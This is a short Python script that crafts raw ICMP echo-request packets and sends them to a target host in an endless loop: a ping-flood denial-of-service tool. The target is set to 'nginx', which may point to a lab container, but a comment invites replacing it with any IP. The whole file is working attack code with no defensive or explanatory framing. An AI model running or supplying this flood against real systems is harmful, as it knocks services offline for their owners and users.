import socket
import struct
import os

# Target IP address
target_ip = 'nginx'  # Replace this with the target IP address


# Calculate checksum
def calculate_checksum(data):
    checksum = 0
    # Handling cases where data length is odd
    if len(data) % 2:
        data += b'\x00'

    for i in range(0, len(data), 2):
        word = (data[i] << 8) + data[i + 1]
        checksum += word

    checksum = (checksum >> 16) + (checksum & 0xffff)
    checksum += checksum >> 16
    return ~checksum & 0xffff


# Craft ICMP packet
def craft_icmp_packet():
    # ICMP header (type, code, checksum, identifier, sequence)
    icmp_type = 8  # ICMP Echo Request
    code = 0
    checksum = 0
    identifier = 12345
    sequence = 1
    header = struct.pack("!BBHHH", icmp_type, code, checksum, identifier, sequence)
    data = b'Hello'  # Payload

    # Calculate checksum
    checksum = calculate_checksum(header + data)

    # Craft final packet
    packet = struct.pack("!BBHHH", icmp_type, code, socket.htons(checksum), identifier, sequence) + data
    return packet


# Send ICMP packets
def send_icmp_flood():
    icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    while True:  # Change the number of packets to simulate
        packet = craft_icmp_packet()
        icmp_socket.sendto(packet, (target_ip, 0))

    icmp_socket.close()


send_icmp_flood()
